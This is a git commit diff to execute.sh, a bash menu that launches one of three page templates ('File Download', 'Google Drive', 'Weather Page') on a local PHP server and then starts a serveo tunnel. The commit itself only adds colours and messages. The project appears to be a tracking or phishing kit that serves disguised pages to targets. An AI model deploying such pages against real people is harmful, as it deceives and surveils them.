068fd6a80dd32aa8270320d01f47c679ba0d2bd3
lifeofsoumya <mondalsoumya2001@gmail.com>
2022-01-13 13:04:21 +0530

    added color function and template choosing option

--- execute.sh
+++ execute.sh
@@ -1,14 +1,29 @@
-echo "Choose the Template:"
-echo "1. File Download"
-echo "2. Google Drive"
-echo "3. Weather Page"
+Red='\033[0;31m'          # Red
+Green='\033[0;32m'        # Green
+Yellow='\033[0;33m'       # Yellow
+White='\033[0;37m'        # White
 
-read -p "Enter Template Number: " tempno
 
+echo -e "${Green}Choose the Template:"
+echo
+echo -e "${Yellow}[+] 1. File Download"
+echo "[+] 2. Google Drive"
+echo "[+] 3. Weather Page"
+echo "."
+echo "."
+echo "."
+echo "."
+
+read -p ">> Enter Template Number: " tempno
+
+echo "."
+echo "."
+echo "."
+echo "."
 
 filedownload(){
 
-    echo "Starting PHP Server"
+    echo "Starting PHP Server..."
     cd /Tracker/filedownload
     php -S 127.0.0.1:8000
     echo "Starting serveo"
@@ -18,7 +33,7 @@ filedownload(){
 
 gdrive(){
 
-    echo "Starting PHP Server"
+    echo "Starting PHP Server..."
     cd /Tracker/gdrive
     php -S 127.0.0.1:8000
     echo "Starting serveo"
@@ -28,7 +43,7 @@ gdrive(){
 
 weather(){
 
-    echo "Starting PHP Server"
+    echo "Starting PHP Server..."
     cd /Tracker/weather
     php -S 127.0.0.1:8000
     echo "Starting serveo"
@@ -39,10 +54,18 @@ weather(){
 
 if [ $tempno == 1 ]
 then
+    echo "Executing File Downloader Template"
     filedownload
+
 elif [ $tempno == 2 ]
 then 
+    echo "Executing Google Drive Template"
     gdrive
-else
+
+elif [ $tempno == 3 ]
+then
+    echo "Executing Weather Template"
     weather
+else
+    echo -e "${Red}Please choose a proper Template!"
 fi
